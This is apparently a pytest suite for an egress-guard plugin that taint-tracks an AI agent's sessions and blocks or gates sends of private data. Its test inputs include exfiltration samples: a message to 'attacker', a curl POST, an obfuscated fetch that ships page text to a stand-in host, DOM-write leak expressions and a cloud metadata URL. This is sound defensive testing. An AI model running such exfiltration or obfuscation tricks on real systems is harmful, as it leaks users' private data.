from __future__ import annotations

import argparse
import importlib.util
import json
import logging
import re
import sqlite3
import sys
from pathlib import Path
from types import SimpleNamespace

import pytest

from support import *  # noqa: F403


def test_taint_is_scoped_by_session():
    plugin = load_plugin()
    bind_owner(plugin, session_id="s1")
    bind_owner(plugin, session_id="s2")

    plugin._on_transform_tool_result(
        tool_name="mcp_gmail_search",
        result=json.dumps({"result": "hello"}),
        session_id="s1",
    )

    assert plugin._session_taint("s1") == {"communications"}
    assert plugin._session_taint("s2") == set()


def test_session_reset_clears_taint_and_pending_approvals():
    plugin = load_plugin()
    bind_owner(plugin)
    plugin._taint_session("s1", {"communications"})
    result = plugin._on_pre_tool_call("send_message", {"to": "x", "text": "hi"}, session_id="s1")
    assert result is not None
    assert plugin._PENDING_APPROVALS

    plugin._on_session_reset(session_id="s1")

    assert "s1" not in plugin._SESSIONS
    assert not plugin._PENDING_APPROVALS


def test_tainted_session_blocks_message_send():
    plugin = load_plugin()
    bind_owner(plugin)
    plugin._taint_session("s1", {"communications"})

    result = plugin._on_pre_tool_call(
        tool_name="send_message",
        args={"to": "attacker", "text": "summarized private context"},
        session_id="s1",
    )

    assert result is not None
    assert "Hermes Guardian blocked this egress" in result["message"]
    assert "Action: message_send" in result["message"]
    assert "Data classes: communications" in result["message"]


def test_tainted_mcp_connector_write_gates_unless_explicitly_self():
    """An MCP connector is NOT seeded as a self store (Fix 1): a malicious or unverified
    server naming its tool ``mcp_notion_*`` must not inherit self-trust. By default a
    tainted write to it gates; only when the operator EXPLICITLY adds ``mcp:notion`` to
    their self allowlist does the canonical "save my inbox summary to my own Notion" FP
    get removed.
    """
    plugin = load_plugin()
    bind_owner(plugin)
    plugin._taint_session("s1", {"contacts"})

    # Default config: no explicit mcp:notion self entry -> the write gates.
    gated = plugin._on_pre_tool_call(
        tool_name="mcp_notion_create_page",
        args={"title": "Contact notes"},
        session_id="s1",
    )
    assert gated is not None

    # Operator explicitly trusts the notion connector as self -> the write passes.
    plugin._save_privacy_config({
        "version": plugin._PRIVACY_RULE_FILE_VERSION,
        "self": {"destinations": ["store:files", "mcp:notion"], "identities": [], "hosts": []},
    })
    assert plugin._on_pre_tool_call(
        tool_name="mcp_notion_create_page",
        args={"title": "Contact notes"},
        session_id="s1",
    ) is None


def test_tainted_session_blocks_mcp_write_to_non_self_store():
    """The floor side of the same coin: a write to an MCP store that is NOT in the self
    allowlist resolves unknown -> external and still gates under taint."""
    plugin = load_plugin()
    bind_owner(plugin)
    plugin._taint_session("s1", {"contacts"})

    result = plugin._on_pre_tool_call(
        tool_name="mcp_acmecrm_create_record",
        args={"title": "Contact notes"},
        session_id="s1",
    )

    assert result is not None
    assert "Action: mcp_write" in result["message"]
    assert "Destination: mcp:acmecrm" in result["message"]


def test_privacy_allow_rule_allows_notion_writes(monkeypatch):
    plugin = load_plugin()
    save_privacy_config(plugin, rules=[privacy_rule()])
    bind_owner(plugin)
    plugin._taint_session("s1", {"communications", "contacts"})

    result = plugin._on_pre_tool_call(
        tool_name="mcp_notion_create_page",
        args={"title": "Contact notes"},
        session_id="s1",
    )

    assert result is None


def test_privacy_allow_rule_is_narrow_by_destination(monkeypatch):
    plugin = load_plugin()
    save_privacy_config(plugin, rules=[privacy_rule()])
    bind_owner(plugin)
    plugin._taint_session("s1", {"communications"})

    result = plugin._on_pre_tool_call(
        tool_name="mcp_slack_create_page",
        args={"title": "x"},
        session_id="s1",
    )

    assert result is not None
    assert "Destination: mcp:slack" in result["message"]


def test_privacy_deny_rule_blocks_before_default_approval():
    plugin = load_plugin()
    save_privacy_config(plugin, rules=[
        privacy_rule(
            rule_id="rule_no_friend",
            effect="deny",
            action_family="message_send",
            destination="friend",
            data_classes=["*"],
        )
    ])
    bind_owner(plugin)

    result = plugin._on_pre_tool_call(
        tool_name="send_message",
        args={"to": "friend", "text": "public hello"},
        session_id="s1",
    )

    assert result is not None
    assert "denied this egress by privacy rule" in result["message"]
    rows = plugin._activity_rows({"decision": "blocked"}, limit=10)
    assert rows[0]["rule_id"] == "rule_no_friend"
    assert rows[0]["rule_effect"] == "deny"


def test_privacy_rule_expires_by_timestamp(monkeypatch):
    now = {"value": 1_000}
    plugin = load_plugin()
    monkeypatch.setattr(plugin.state, "_now", lambda: now["value"])
    save_privacy_config(plugin, rules=[
        privacy_rule(
            rule_id="rule_temporary",
            action_family="message_send",
            destination="friend",
            data_classes=["communications"],
            expires_at=1_300,
        )
    ])
    bind_owner(plugin)
    plugin._taint_session("s1", {"communications"})

    assert plugin._on_pre_tool_call("send_message", {"to": "friend", "text": "hello"}, session_id="s1") is None
    assert len(plugin._persistent_privacy_rules()) == 1
    now["value"] = 1_301
    assert plugin._on_pre_tool_call("send_message", {"to": "friend", "text": "again"}, session_id="s1") is not None


def test_legacy_finite_invocation_rule_fails_closed():
    plugin = load_plugin()
    save_privacy_config(plugin, rules=[
        privacy_rule(
            rule_id="rule_legacy_once",
            action_family="message_send",
            destination="friend",
            data_classes=["communications"],
            remaining_invocations=1,
        )
    ])
    assert plugin._persistent_privacy_rules() == []


def test_message_send_uses_messaging_destination_with_hashed_recipient_identity():
    plugin = load_plugin()
    bind_owner(plugin)
    plugin._taint_session("s1", {"communications"})

    result = plugin._on_pre_tool_call(
        "send_message",
        {"to": "friend", "text": "hello", "purpose": "Follow Up"},
        session_id="s1",
    )

    assert result is not None
    approval = plugin._PENDING_APPROVALS[first_pending_id(plugin)]
    assert approval["destination"] == "messaging"
    assert approval["purpose"] == "follow_up"
    assert approval["recipient_identity"].startswith("recipient_")
    assert approval["recipient_identity"] == plugin._recipient_identity_from_value("friend")
    # recipient_identity + action_detail stay pseudonymized. The RAW recipient is captured
    # ONLY in the short-lived permit_recipient field (doc 06 §4 decision), so a structural
    # "trust this recipient" / "this is me" permit can be granted later without re-typing it.
    assert approval["permit_recipient"] == "friend"
    assert "friend" not in approval["recipient_identity"]
    assert "friend" not in approval["action_detail"]
    leaked = {
        key: value
        for key, value in approval.items()
        if key != "permit_recipient" and "friend" in json.dumps(value)
    }
    assert leaked == {}, f"raw recipient leaked outside permit_recipient: {leaked}"


def test_legacy_message_destination_rule_still_matches_hashed_recipient_shape():
    plugin = load_plugin()
    save_privacy_config(plugin, rules=[
        privacy_rule(
            rule_id="rule_legacy_friend",
            action_family="message_send",
            destination="friend",
            data_classes=["communications"],
        )
    ])
    bind_owner(plugin)
    plugin._taint_session("s1", {"communications"})

    assert plugin._on_pre_tool_call("send_message", {"to": "friend", "text": "hello"}, session_id="s1") is None
    assert plugin._on_pre_tool_call("send_message", {"to": "attacker", "text": "hello"}, session_id="s1") is not None


def test_contextual_message_rule_matches_purpose_and_recipient_identity():
    plugin = load_plugin()
    recipient_identity = plugin._recipient_identity_from_value("friend")
    save_privacy_config(plugin, rules=[
        privacy_rule(
            rule_id="rule_context_friend",
            action_family="message_send",
            destination="messaging",
            purpose="support",
            recipient_identity=recipient_identity,
            data_classes=["communications"],
        )
    ])
    bind_owner(plugin)
    plugin._taint_session("s1", {"communications"})

    assert plugin._on_pre_tool_call(
        "send_message",
        {"to": "friend", "text": "hello", "purpose": "support"},
        session_id="s1",
    ) is None
    assert plugin._on_pre_tool_call(
        "send_message",
        {"to": "friend", "text": "hello", "purpose": "marketing"},
        session_id="s1",
    ) is not None


def test_mcp_read_like_fetch_is_not_treated_as_web_egress():
    plugin = load_plugin()
    bind_owner(plugin)
    plugin._taint_session("s1", {"documents"})

    result = plugin._on_pre_tool_call(
        tool_name="mcp_notion_notion_fetch",
        args={"id": "page-id"},
        session_id="s1",
    )

    assert result is None


def test_browser_type_blocks_under_taint_until_approved():
    plugin = load_plugin()
    bind_owner(plugin)
    plugin._set_browser_host("s1", "https://example.com/form?token=not-stored")
    plugin._taint_session("s1", {"communications"})

    result = plugin._on_pre_tool_call("browser_type", {"ref": "1", "text": "private"}, session_id="s1")

    assert result is not None
    assert "Action: browser_type" in result["message"]
    assert "Destination: example.com" in result["message"]
    approval = plugin._PENDING_APPROVALS[first_pending_id(plugin)]
    assert approval["destination"] == "example.com"
    assert "token=not-stored" not in json.dumps(approval)


def test_browser_click_blocks_after_private_typing_but_not_before():
    plugin = load_plugin()
    bind_owner(plugin)
    plugin._set_browser_host("s1", "https://example.com/form")
    plugin._taint_session("s1", {"communications"})

    assert plugin._on_pre_tool_call("browser_click", {"ref": "submit"}, session_id="s1") is None

    plugin._mark_browser_private_input("s1")
    result = plugin._on_pre_tool_call("browser_click", {"ref": "submit"}, session_id="s1")

    assert result is not None
    assert "Action: browser_click" in result["message"]


def test_browser_press_blocks_after_private_typing():
    plugin = load_plugin()
    bind_owner(plugin)
    plugin._set_browser_host("s1", "https://example.com/form")
    plugin._taint_session("s1", {"communications"})
    plugin._mark_browser_private_input("s1")

    result = plugin._on_pre_tool_call("browser_press", {"key": "Enter"}, session_id="s1")

    assert result is not None
    assert "Action: browser_press" in result["message"]
    assert "Destination: example.com" in result["message"]


def test_browser_dialog_blocks_after_private_typing():
    plugin = load_plugin()
    bind_owner(plugin)
    plugin._set_browser_host("s1", "https://example.com/form")
    plugin._taint_session("s1", {"communications"})
    plugin._mark_browser_private_input("s1")

    result = plugin._on_pre_tool_call("browser_dialog", {"action": "accept"}, session_id="s1")

    assert result is not None
    assert "Action: browser_dialog" in result["message"]


def test_browser_console_pure_read_eval_logs_as_read_under_taint():
    plugin = load_plugin()
    bind_owner(plugin)
    plugin._set_browser_host("s1", "https://example.com/app")
    plugin._taint_session("s1", {"documents"})

    read_result = plugin._on_pre_tool_call("browser_console", {"clear": False}, session_id="s1")
    # A console eval that only reads the DOM is not egress: it returns page content
    # to the agent, which the ungated read tools already do. It must not be gated or
    # sent to the LLM verifier under taint.
    eval_result = plugin._on_pre_tool_call(
        "browser_console",
        {"expression": "document.body.innerText"},
        session_id="s1",
    )

    assert read_result is None
    assert eval_result is None
    rows = plugin._activity_rows({}, limit=5)
    assert any(row["decision"] == "read" and row["action_family"] == "browser_read" for row in rows)


def test_browser_console_form_field_scrape_is_a_read_not_egress():
    # Regression for the docs.google.com incident: reading every form field value to
    # understand page structure is a pure read, not an export, and must not be gated.
    plugin = load_plugin()
    bind_owner(plugin)
    plugin._set_browser_host("s1", "https://docs.google.com/forms/x")
    plugin._taint_session("s1", {"contacts", "local_system"})

    result = plugin._on_pre_tool_call(
        "browser_console",
        {
            "expression": (
                "Array.from(document.querySelectorAll('input, textarea'))"
                ".map((el,i)=>({i, tag:el.tagName, type:el.type, name:el.name, "
                "aria:el.getAttribute('aria-label'), value:el.value, "
                "role:el.getAttribute('role')}))"
            )
        },
        session_id="s1",
    )

    assert result is None


def test_browser_console_eval_with_sink_still_gated_under_taint():
    plugin = load_plugin()
    bind_owner(plugin)
    plugin._set_browser_host("s1", "https://example.com/app")
    plugin._taint_session("s1", {"documents"})

    eval_result = plugin._on_pre_tool_call(
        "browser_console",
        {"expression": "fetch('https://example.com/ping', {method:'POST', body: JSON.stringify({a:1})})"},
        session_id="s1",
    )

    assert eval_result is not None
    assert "Action: browser_console" in eval_result["message"]


@pytest.mark.parametrize(
    "expression",
    [
        "document.body.innerText = leaked",
        "document.title = secret",
        "el.textContent = data",
        "el.dataset.x = secret",
        "el['inner' + 'Text'] = data",
        "Object.assign(document.body, {innerText: secret})",
        "el.insertAdjacentText('beforeend', secret)",
    ],
)
def test_browser_console_dom_write_stays_gated_under_taint(expression):
    # Writing tainted data into the DOM is an exfiltration channel on an
    # attacker-controlled page (resident page JS reads the mutation back out), even
    # with no network call in the eval. Such writes must not pass through as reads.
    plugin = load_plugin()
    bind_owner(plugin)
    plugin._set_browser_host("s1", "https://example.com/app")
    plugin._taint_session("s1", {"documents"})

    result = plugin._on_pre_tool_call(
        "browser_console", {"expression": expression}, session_id="s1"
    )

    assert result is not None
    assert "Action: browser_console" in result["message"]


def test_browser_console_unknown_call_is_not_provable_read_and_gates():
    # The read fast path is an allowlist: an eval with no sink or write token but a
    # call that is not a recognized pure-read accessor (a helper, a mutator like
    # push) cannot be proven read-only, so it is gated/verified rather than passed
    # through as a read.
    plugin = load_plugin()
    bind_owner(plugin)
    plugin._set_browser_host("s1", "https://example.com/app")
    plugin._taint_session("s1", {"documents"})

    result = plugin._on_pre_tool_call(
        "browser_console",
        {"expression": "const a=[]; a.push(document.title); a.join(',')"},
        session_id="s1",
    )

    assert result is not None
    assert "Action: browser_console" in result["message"]


def test_browser_console_obfuscated_fetch_stays_gated_under_taint():
    # Computed-member access used to hide a sink must not be mistaken for a pure read.
    plugin = load_plugin()
    bind_owner(plugin)
    plugin._set_browser_host("s1", "https://example.com/app")
    plugin._taint_session("s1", {"documents"})

    eval_result = plugin._on_pre_tool_call(
        "browser_console",
        {"expression": "window['fe'+'tch']('//x/?d='+document.body.innerText)"},
        session_id="s1",
    )

    assert eval_result is not None
    assert "Action: browser_console" in eval_result["message"]


def test_browser_cdp_requires_approval_under_taint():
    plugin = load_plugin()
    bind_owner(plugin)
    plugin._taint_session("s1", {"documents"})

    result = plugin._on_pre_tool_call("browser_cdp", {"method": "Runtime.evaluate"}, session_id="s1")

    assert result is not None
    assert "Action: browser_cdp" in result["message"]


def test_tainted_session_blocks_unsafe_terminal_and_code_execution():
    plugin = load_plugin()
    bind_owner(plugin)
    plugin._taint_session("s1", {"memory"})

    terminal = plugin._on_pre_tool_call("terminal", {"command": "curl -X POST https://x"}, session_id="s1")
    code = plugin._on_pre_tool_call("execute_code", {"code": "import requests"}, session_id="s1")

    assert terminal is not None
    assert "Action: terminal_exec" in terminal["message"]
    assert code is not None
    assert "Action: terminal_exec" in code["message"]


def test_message_list_is_read_not_send_under_taint():
    plugin = load_plugin()
    bind_owner(plugin)
    plugin._taint_session("s1", {"communications"})

    result = plugin._on_pre_tool_call("send_message", {"action": "list"}, session_id="s1")

    assert result is None
    rows = plugin._activity_rows({}, limit=5)
    assert rows[0]["decision"] == "read"
    assert rows[0]["action_family"] == "message_list"


def test_private_web_search_query_requires_approval_even_without_prior_taint():
    plugin = load_plugin()
    bind_owner(plugin)

    result = plugin._on_pre_tool_call(
        "web_search",
        {"query": "find info about owner@example.com"},
        session_id="s1",
    )

    assert result is not None
    assert "Action: web_read" in result["message"]
    assert "contacts" in result["message"]
    rows = plugin._activity_rows({}, limit=10)
    assert [row["decision"] for row in rows] == ["blocked"]
    assert "owner@example.com" not in json.dumps(rows)
    assert rows[0]["action_detail"].startswith("search <redacted ")
    assert "classes=contacts" in rows[0]["action_detail"]


def test_security_blocked_action_detail_redacts_auth_code():
    plugin = load_plugin()
    bind_owner(plugin)

    result = plugin._on_pre_tool_call(
        "terminal",
        {"command": 'echo "Your verification code is 123456"'},
        session_id="s1",
    )

    assert result is not None
    rows = plugin._activity_rows({}, limit=10)
    assert rows[0]["decision"] == "security_blocked"
    assert "123456" not in json.dumps(rows)
    assert "security-sensitive content redacted" in rows[0]["action_detail"]


def test_browser_console_action_detail_redacts_private_expression():
    plugin = load_plugin()
    bind_owner(plugin)
    plugin._set_browser_host("s1", "https://example.com/app")
    plugin._taint_session("s1", {"communications"})

    result = plugin._on_pre_tool_call(
        "browser_console",
        {"expression": "fetch('/x', {body: 'owner@example.com'})"},
        session_id="s1",
    )

    assert result is not None
    rows = plugin._activity_rows({}, limit=10)
    assert "owner@example.com" not in json.dumps(rows)
    assert "<email>" in rows[0]["action_detail"]


def test_web_search_query_under_taint_requires_approval():
    plugin = load_plugin()
    bind_owner(plugin)
    plugin._taint_session("s1", {"communications"})

    result = plugin._on_pre_tool_call("web_search", {"query": "python docs"}, session_id="s1")

    assert result is not None
    assert "Action: web_read" in result["message"]
    rows = plugin._activity_rows({}, limit=5)
    assert rows[0]["decision"] == "blocked"
    assert rows[0]["action_family"] == "web_read"
    assert rows[0]["data_classes"] == "communications"
    assert "python docs" not in result["message"]
    assert rows[0]["action_detail"] == "search <redacted 11 chars>"


def test_tainted_web_extract_allows_exact_public_discovered_url():
    plugin = load_plugin()
    bind_owner(plugin)
    assert plugin._on_pre_tool_call("web_search", {"query": "public briefing news"}, session_id="s1") is None
    plugin._on_transform_tool_result(
        "web_search",
        "Top story: https://lantian.pub/some/article",
        session_id="s1",
    )
    plugin._taint_session("s1", {"calendar", "communications", "contacts"})

    result = plugin._on_pre_tool_call(
        "web_extract",
        {"url": "http://lantian.pub/some/article/"},
        session_id="s1",
    )

    assert result is None
    rows = plugin._activity_rows({}, limit=10)
    assert rows[0]["decision"] == "read"
    assert rows[0]["tool_name"] == "web_extract"
    assert not any(row["decision"] == "blocked" for row in rows)


def test_tainted_web_extract_discovered_url_mismatch_still_gates():
    plugin = load_plugin()
    bind_owner(plugin)
    assert plugin._on_pre_tool_call("web_search", {"query": "public briefing news"}, session_id="s1") is None
    plugin._on_transform_tool_result(
        "web_search",
        "Top story: https://example.com/a?x=1",
        session_id="s1",
    )
    plugin._taint_session("s1", {"communications"})

    result = plugin._on_pre_tool_call(
        "web_extract",
        {"url": "https://example.com/a?x=2"},
        session_id="s1",
    )

    assert result is not None
    assert "Action: web_read" in result["message"]


def test_malformed_public_discovered_url_is_ignored():
    plugin = load_plugin()
    bind_owner(plugin)
    assert plugin._on_pre_tool_call("web_search", {"query": "public briefing news"}, session_id="s1") is None

    result = plugin._on_transform_tool_result(
        "web_search",
        "Malformed public result: https://[not-an-ipv6]/place",
        session_id="s1",
    )

    assert result is None


def test_private_discovered_url_is_not_remembered_for_tainted_web_extract():
    plugin = load_plugin()
    bind_owner(plugin)
    assert plugin._on_pre_tool_call("web_search", {"query": "metadata endpoint"}, session_id="s1") is None
    plugin._on_transform_tool_result(
        "web_search",
        "Endpoint: http://169.254.169.254/latest/meta-data/",
        session_id="s1",
    )
    plugin._taint_session("s1", {"communications"})

    result = plugin._on_pre_tool_call(
        "web_extract",
        {"url": "http://169.254.169.254/latest/meta-data/"},
        session_id="s1",
    )

    assert result is not None


def test_tainting_web_result_does_not_seed_public_discovered_url():
    plugin = load_plugin()
    bind_owner(plugin)
    assert plugin._on_pre_tool_call("web_search", {"query": "public briefing news"}, session_id="s1") is None
    plugin._on_transform_tool_result(
        "web_search",
        "Top story: https://example.com/a\nFrom: owner@example.com\nSubject: private note",
        session_id="s1",
    )
    assert "communications" in plugin._session_taint("s1")

    result = plugin._on_pre_tool_call(
        "web_extract",
        {"url": "https://example.com/a"},
        session_id="s1",
    )

    assert result is not None


def test_tainted_session_gates_outward_delegation_and_unknown_sinks():
    """Phase 3 (decide authoritative): outward / unknown-trust sinks still gate under
    taint, while intra-boundary writes (local_system / model_provider) no longer do.

    delegate_task -> subagent (unknown trust) and feishu_drive_add_comment -> generic
    tool_write (opaque -> unknown -> external) reach a party that is not provably the
    owner, so they remain gated — the floor is preserved for the cases that cross outward.
    """
    plugin = load_plugin()
    bind_owner(plugin)
    plugin._taint_session("s1", {"memory"})

    for tool_name, args in [
        ("delegate_task", {"goal": "summarize this"}),
        ("feishu_drive_add_comment", {"comment": "please review"}),
    ]:
        result = plugin._on_pre_tool_call(tool_name, args, session_id="s1")
        assert result is not None, tool_name


def test_tainted_session_allows_intra_boundary_writes_after_flip():
    """Phase 3 FP reduction (doc 04 §5): a tainted session writing to the operator's own
    local system or to the model provider reaches no new party, so these intra-boundary
    writes that gated pre-flip now ALLOW. This is the dominant false positive the
    destination-trust refactor removes (charter §1) and is floor-neutral — the data is
    exposed to no one other than its owner. The floor benchmarks (adversarial 1.0,
    agentdojo 0.9615) hold with these allowed.
    """
    plugin = load_plugin()
    bind_owner(plugin)
    plugin._taint_session("s1", {"memory"})

    intra_boundary = [
        ("mixture_of_agents", {"user_prompt": "solve this"}),       # model_provider
        ("text_to_speech", {"text": "read this aloud"}),            # model_provider
        ("cronjob", {"action": "create", "prompt": "send a report", "schedule": "1h"}),
        ("write_file", {"path": "/tmp/report.txt", "content": "summary"}),
        ("patch", {"path": "/tmp/report.txt", "old_string": "a", "new_string": "b"}),
        ("skill_manage", {"action": "create", "name": "private-skill", "content": "steps"}),
        ("memory", {"action": "add", "target": "user", "content": "preference"}),
        ("mnemosyne_remember", {"content": "preference"}),
        ("computer_use", {"action": "type", "text": "hello"}),
        ("ha_call_service", {"domain": "light", "service": "turn_on"}),
    ]

    for tool_name, args in intra_boundary:
        result = plugin._on_pre_tool_call(tool_name, args, session_id="s1")
        assert result is None, tool_name


# --- Fix 3: remote-text gate fails closed on unknown keys ---------------------


def test_tainted_mcp_search_gates_on_unenumerated_text_keys():
    """Under taint, an MCP read/search ships free text via ANY key, not just a fixed
    set. Private text riding `question` / `keywords` / nested `params.text` must gate."""
    plugin = load_plugin()
    bind_owner(plugin)
    plugin._taint_session("s1", {"communications"})

    for tool_name, args in [
        ("mcp_perplexity_search", {"question": "my private salary is 200k"}),
        ("web_search", {"keywords": "my private medical diagnosis"}),
        ("mcp_notion_search", {"params": {"text": "private board minutes"}}),
    ]:
        result = plugin._on_pre_tool_call(tool_name, args, session_id="s1")
        assert result is not None, tool_name
        assert result["action"] in {"block", "approve"}, tool_name


def test_untainted_read_with_only_id_or_enum_does_not_gate():
    """A benign read whose only args are an id / enum / limit must NOT gate (no free
    text to leak)."""
    plugin = load_plugin()
    bind_owner(plugin)
    # No taint: a read is never a sink regardless, but also confirm the free-text
    # detector itself does not flag bare ids / enums / numbers.
    tp = plugin.tool_policy
    for args in [{"id": "abc"}, {"limit": 10}, {"cursor": "eyJ0"}, {"format": "json"},
                 {"params": {"id": "page_123"}}, {"enabled": True}]:
        assert not tp._mcp_read_sends_query(args), args
        assert not tp._args_send_remote_text(args), args


def test_tainted_read_with_only_id_arg_does_not_gate_end_to_end():
    plugin = load_plugin()
    bind_owner(plugin)
    plugin._taint_session("s1", {"communications"})
    # An MCP read carrying only an id (no free text) is not a remote-text sink, so it
    # does not gate even under taint.
    assert plugin._on_pre_tool_call(
        "mcp_drive_get_file_metadata", {"id": "abc"}, session_id="s1"
    ) is None


# --- Fix 4: classifier input clamp fails closed (soft-DoS) --------------------


def test_over_cap_tool_result_still_taints():
    """An over-cap tool result must NOT be scanned-and-declared-clean: it fails closed,
    tainting the session conservatively as `documents`, so private content hidden past
    the byte cap cannot slip out untainted (soft-DoS guard)."""
    plugin = load_plugin()
    bind_owner(plugin, session_id="sCap")
    tp = plugin.tool_policy
    over_cap = "a" * (tp._CONTENT_CLASSIFIER_BYTE_CAP + 64)

    # The classifier helpers fail closed on over-cap input, even though the content
    # carries no private signal that a prefix scan would catch.
    assert tp._classes_from_content(over_cap) == {"documents"}
    assert tp._doc_content_taint_classes(over_cap) == {"documents"}
    assert tp._web_content_taint_classes(over_cap, "sCap") == {"documents"}
    # Under-cap clean content is unaffected.
    assert tp._classes_from_content("hello world") == set()

    # End to end: observing the over-cap result taints the session.
    plugin._on_transform_tool_result(
        tool_name="some_generic_reader", result=over_cap, session_id="sCap"
    )
    assert "documents" in plugin._session_taint("sCap")
